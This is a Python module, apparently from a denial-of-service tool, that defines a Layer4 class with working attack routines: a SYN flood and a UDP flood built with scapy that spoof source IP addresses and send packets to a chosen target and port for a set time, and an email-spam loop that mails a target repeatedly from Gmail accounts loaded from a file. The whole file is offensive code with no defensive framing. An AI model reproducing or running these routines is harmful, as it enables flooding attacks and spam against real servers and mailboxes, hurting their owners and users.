"""Layer 4 Denial of Service attacks."""

from scapy.all import IP, TCP, UDP, send
import time as timing
from src.globals import GMAIL_ACCOUNT_FILE
from src.emailsender import MailSender
from src.utils import spoof_ip, rand_int, get_gmail_account_from_file


class Layer4:
    @staticmethod
    def syn_flood(target: str, port: int, time: int):
        end_t = timing.time() + time
        ip_packet = IP(dst=str(target), src=spoof_ip())
        tcp_packet = TCP(sport=rand_int(), dport=int(
            port), flags="S", seq=rand_int(), window=rand_int())
        while (timing.time() < end_t):
            send(ip_packet/tcp_packet, verbose=0)

    @staticmethod
    def udp_flood(target: str, port: int, time: int):
        end_t = timing.time() + time
        ip_packet = IP(dst=str(target), src=spoof_ip())
        udp_packet = UDP(sport=rand_int(), dport=int(port))
        payload = "A" * 65500
        while (timing.time() < end_t):
            send(ip_packet/udp_packet/payload, verbose=0)

    @staticmethod
    def email_spam(target: str, time: int, message: str):
        account, password = get_gmail_account_from_file(
            GMAIL_ACCOUNT_FILE)
        mail_sender = MailSender(account, password)
        mail_sender.connect()
        end_t = timing.time() + time
        while (timing.time() < end_t):
            mail_sender.send_mail(target, message)
            timing.sleep(5)
        mail_sender.disconnect()
